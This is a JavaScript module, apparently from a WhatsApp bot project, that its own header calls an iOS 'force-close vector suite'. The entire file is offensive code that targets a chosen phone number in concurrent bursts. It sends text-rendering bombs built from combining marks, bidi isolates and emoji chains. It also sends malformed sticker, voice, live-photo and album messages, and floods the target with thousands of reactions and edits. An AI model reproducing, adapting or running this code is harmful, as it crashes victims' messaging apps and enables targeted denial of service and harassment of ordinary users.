// ./SY/S7/iosdrop.js
// iosdrop — iOS force-close vector suite for WhatsApp (iOS 16-18).
// Two kill paths on iOS: Jetsam (memory pressure) and Watchdog
// (main thread block > 20s → SpringBoard SIGKILL).
// Vectors: CoreText shaping storm, ICU bidi nest, emoji ZWJ mega-chain,
// sticker metadata mismatch, voice waveform overflow, live-photo pair,
// album type-mix, reaction aggregation, edit churn.
// Single burst. No time loop. Stronger than Android equivalents because
// iOS UIKit main-thread block triggers hard watchdog kill.

const {
    generateWAMessageFromContent,
    delay,
} = require('@whiskeysockets/baileys');

// ---------- relay ----------
async function relay(client, targetJid, content, extra = {}) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
    const waMsg = generateWAMessageFromContent(targetJid, content, { userJid });
    await client.relayMessage(targetJid, waMsg.message, {
        messageId: waMsg.key.id,
        ...extra,
    });
    return waMsg.key.id;
}

async function resolveBestJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return lid;
        }
    } catch {}
    return targetJid;
}

// ============================================================
// VECTOR 1 — CoreText shaping storm
// iOS CoreText: many clusters each with combining marks → total
// shaped glyph count explodes. Main thread blocks in CTLineCreate.
// ============================================================
function buildCoreTextBomb(seed = 0) {
    const combining =
        '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307' +
        '\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F';
    const cluster = 'x' + combining.repeat(10);
    return cluster.repeat(4000 + seed * 800);
}

// ============================================================
// VECTOR 2 — ICU bidi isolate nest
// iOS ICU bidi algorithm: deeply nested directional isolates are
// O(n²). 1500+ isolates = multi-second layout pass per frame.
// ============================================================
function buildIosBidiBomb() {
    const bidi =
        '\u2066\u2067\u2068\u2069\u202A\u202B\u202C\u202D\u202E';
    return bidi.repeat(1500);
}

// ============================================================
// VECTOR 3 — emoji ZWJ mega chain
// iOS 17-18 NotoColorEmoji equivalent (Apple Color Emoji) fallback
// cache miss storm on giant ZWJ chains.
// ============================================================
function buildIosEmojiBomb() {
    const chain = '👨\u200D👩\u200D👧\u200D👦\u200D🧑\u200D👨\u200D🦱\u200D👩\u200D🦰';
    return chain.repeat(400);
}

// ============================================================
// VECTOR 4 — CoreText + bidi + emoji combined, view-once wrapped
// view-once forces extra parse path on iOS.
// ============================================================
function buildIosCombined() {
    return buildCoreTextBomb(2) + buildIosBidiBomb() + buildIosEmojiBomb();
}

// ============================================================
// Send functions
// ============================================================
async function sendCoreText(client, jid, seed) {
    await relay(client, jid, {
        extendedTextMessage: {
            text: buildCoreTextBomb(seed),
            contextInfo: { mentionedJid: [jid] },
        },
    });
}

async function sendIosBidi(client, jid) {
    await relay(client, jid, {
        extendedTextMessage: {
            text: buildIosBidiBomb(),
            contextInfo: { mentionedJid: [jid] },
        },
    });
}

async function sendIosEmoji(client, jid) {
    await relay(client, jid, {
        extendedTextMessage: {
            text: buildIosEmojiBomb(),
            contextInfo: { mentionedJid: [jid] },
        },
    });
}

async function sendIosCombined(client, jid) {
    await relay(client, jid, {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: buildIosCombined(),
                    contextInfo: { mentionedJid: [jid] },
                },
            },
        },
    });
}

// ============================================================
// VECTOR 5 — sticker metadata mismatch
// Claims Lottie animated but no payload → iOS sticker decoder
// fallback path. Repeated = memory churn.
// ============================================================
async function sendStickerBomb(client, jid, count = 40) {
    for (let i = 0; i < count; i++) {
        try {
            await relay(client, jid, {
                stickerMessage: {
                    url: `https://mmg.whatsapp.net/fake-sticker-${i}`,
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    mimetype: 'image/webp',
                    height: 512,
                    width: 512,
                    directPath: `/v/t62.7118-24/sticker-${i}`,
                    fileLength: 0,
                    mediaKeyTimestamp: Math.floor(Date.now() / 1000),
                    isAnimated: true,
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: true,
                },
            });
        } catch {}
        await delay(180);
    }
}

// ============================================================
// VECTOR 6 — voice waveform overflow
// Waveform byte array massively oversized vs claimed seconds.
// iOS WhatsApp waveform renderer allocates per-bar; mismatch
// → array bound overflow → memory spike.
// ============================================================
async function sendVoiceWaveformBomb(client, jid, count = 25) {
    const bigWaveform = new Uint8Array(200000);
    for (let i = 0; i < bigWaveform.length; i++) {
        bigWaveform[i] = (i * 37) & 0xff;
    }
    for (let i = 0; i < count; i++) {
        try {
            await relay(client, jid, {
                audioMessage: {
                    url: `https://mmg.whatsapp.net/fake-voice-${i}`,
                    mimetype: 'audio/ogg; codecs=opus',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 100,
                    seconds: 3600,
                    ptt: true,
                    waveform: bigWaveform,
                    directPath: `/v/t62.7117-24/voice-${i}`,
                    mediaKeyTimestamp: Math.floor(Date.now() / 1000),
                },
            });
        } catch {}
        await delay(200);
    }
}

// ============================================================
// VECTOR 7 — live-photo pair mismatch
// imageMessage + videoMessage with same directPath but wrong
// association. iOS live-photo renderer fails to pair.
// ============================================================
async function sendLivePhotoBomb(client, jid, count = 20) {
    for (let i = 0; i < count; i++) {
        const sharedPath = `/v/t62.7118-24/live-${i}`;
        const ts = Math.floor(Date.now() / 1000);

        try {
            await relay(client, jid, {
                imageMessage: {
                    url: `https://mmg.whatsapp.net/live-img-${i}`,
                    mimetype: 'image/jpeg',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 5000000,
                    height: 4032,
                    width: 3024,
                    directPath: sharedPath,
                    mediaKeyTimestamp: ts,
                },
            });
            await delay(80);
            await relay(client, jid, {
                videoMessage: {
                    url: `https://mmg.whatsapp.net/live-vid-${i}`,
                    mimetype: 'video/mp4',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 50000000,
                    seconds: 5,
                    directPath: sharedPath,
                    mediaKeyTimestamp: ts,
                    height: 4032,
                    width: 3024,
                },
            });
        } catch {}
        await delay(220);
    }
}

// ============================================================
// VECTOR 8 — album with mixed types
// iOS album renderer expects homogeneous types. Mixed = layout
// pass exception → cell dealloc chain → memory churn.
// ============================================================
async function sendAlbumMixBomb(client, jid, albums = 15) {
    for (let a = 0; a < albums; a++) {
        const albumId = `I${Date.now()}${a}`;
        const types = ['image', 'video', 'audio', 'sticker'];
        for (let g = 0; g < 4; g++) {
            const t = types[g];
            let content;
            const ts = Math.floor(Date.now() / 1000);
            if (t === 'image') {
                content = {
                    imageMessage: {
                        url: `https://mmg.whatsapp.net/ios-album-${a}-${g}`,
                        mimetype: 'image/jpeg',
                        fileSha256: new Uint8Array(32),
                        fileEncSha256: new Uint8Array(32),
                        mediaKey: new Uint8Array(32),
                        fileLength: 5000000,
                        height: 1080,
                        width: 1080,
                        directPath: `/v/t62.7118-24/ios-album`,
                        mediaKeyTimestamp: ts,
                        contextInfo: { albumId },
                    },
                };
            } else if (t === 'video') {
                content = {
                    videoMessage: {
                        url: `https://mmg.whatsapp.net/ios-album-${a}-${g}`,
                        mimetype: 'video/mp4',
                        fileSha256: new Uint8Array(32),
                        fileEncSha256: new Uint8Array(32),
                        mediaKey: new Uint8Array(32),
                        fileLength: 50000000,
                        seconds: 10,
                        directPath: `/v/t62.7118-24/ios-album`,
                        mediaKeyTimestamp: ts,
                        contextInfo: { albumId },
                    },
                };
            } else if (t === 'audio') {
                content = {
                    audioMessage: {
                        url: `https://mmg.whatsapp.net/ios-album-${a}-${g}`,
                        mimetype: 'audio/ogg; codecs=opus',
                        fileSha256: new Uint8Array(32),
                        fileEncSha256: new Uint8Array(32),
                        mediaKey: new Uint8Array(32),
                        fileLength: 100000,
                        seconds: 30,
                        directPath: `/v/t62.7117-24/ios-album`,
                        mediaKeyTimestamp: ts,
                        contextInfo: { albumId },
                    },
                };
            } else {
                content = {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/ios-album-${a}-${g}`,
                        fileSha256: new Uint8Array(32),
                        fileEncSha256: new Uint8Array(32),
                        mediaKey: new Uint8Array(32),
                        mimetype: 'image/webp',
                        height: 512,
                        width: 512,
                        directPath: `/v/t62.7118-24/ios-album`,
                        mediaKeyTimestamp: ts,
                        contextInfo: { albumId },
                    },
                };
            }
            try { await relay(client, jid, content); } catch {}
            await delay(90);
        }
        await delay(300);
    }
}

// ============================================================
// VECTOR 9 — reaction aggregation storm
// 3000 reactions on same seed. iOS reaction aggregator rebuilds
// for each reaction → main thread block.
// ============================================================
async function sendReactionStorm(client, jid, count = 3000) {
    let seedId;
    try {
        seedId = await relay(client, jid, { conversation: '.' });
    } catch {
        return;
    }
    await delay(300);

    const emojis = ['🔥','💀','⚡','👿','💣','🚨','😈','☠️'];
    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(jid, {
                react: {
                    text: emojis[i % emojis.length],
                    key: { remoteJid: jid, id: seedId, fromMe: true },
                },
            });
        } catch {}
        if (i % 100 === 0) await delay(200);
    }
}

// ============================================================
// VECTOR 10 — edit churn on iOS
// Each edit forces NSAttributedString rebuild + UITextView resize.
// ============================================================
async function sendIosEditChurn(client, jid, seed, count = 200) {
    let seedId;
    try {
        seedId = await relay(client, jid, { conversation: 'seed' });
    } catch {
        return;
    }
    await delay(200);

    const payload = buildCoreTextBomb(seed);
    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(jid, {
                text: `${payload}_e${i}`,
                edit: { remoteJid: jid, id: seedId, fromMe: true },
            });
        } catch {}
        if (i % 30 === 0) await delay(180);
    }
}

// ============================================================
// ORCHESTRATOR — single burst, iOS-optimized concurrent fire
// ============================================================
async function iosDrop(client, targetJid, options = {}) {
    if (!client) throw new Error('iosdrop: client required');
    if (!targetJid) throw new Error('iosdrop: targetJid required');

    const useLid = options.useLid !== false;
    const jid = useLid ? await resolveBestJid(client, targetJid) : targetJid;

    const bursts = Number.isFinite(options.bursts) ? options.bursts : 3;
    const gapMs  = Number.isFinite(options.gapMs)  ? options.gapMs  : 800;

    const report = { jid, bursts: 0, vectors: {} };

    for (let b = 0; b < bursts; b++) {
        const runs = [
            ['coretext',   () => sendCoreText(client, jid, b)],
            ['bidi',       () => sendIosBidi(client, jid)],
            ['emoji',      () => sendIosEmoji(client, jid)],
            ['combined',   () => sendIosCombined(client, jid)],
            ['sticker',    () => sendStickerBomb(client, jid, 30)],
            ['waveform',   () => sendVoiceWaveformBomb(client, jid, 20)],
            ['livephoto',  () => sendLivePhotoBomb(client, jid, 15)],
            ['albummix',   () => sendAlbumMixBomb(client, jid, 10)],
            ['reactions',  () => sendReactionStorm(client, jid, 1500)],
            ['editchurn',  () => sendIosEditChurn(client, jid, b, 150)],
        ];

        const results = await Promise.allSettled(runs.map(([, fn]) => fn()));

        runs.forEach(([name], i) => {
            const ok = results[i].status === 'fulfilled';
            report.vectors[name] = (report.vectors[name] || 0) + (ok ? 1 : 0);
        });

        report.bursts++;
        await delay(gapMs);
    }

    return report;
}

module.exports = {
    iosDrop,
    sendCoreText,
    sendIosBidi,
    sendIosEmoji,
    sendIosCombined,
    sendStickerBomb,
    sendVoiceWaveformBomb,
    sendLivePhotoBomb,
    sendAlbumMixBomb,
    sendReactionStorm,
    sendIosEditChurn,
    resolveBestJid,
};
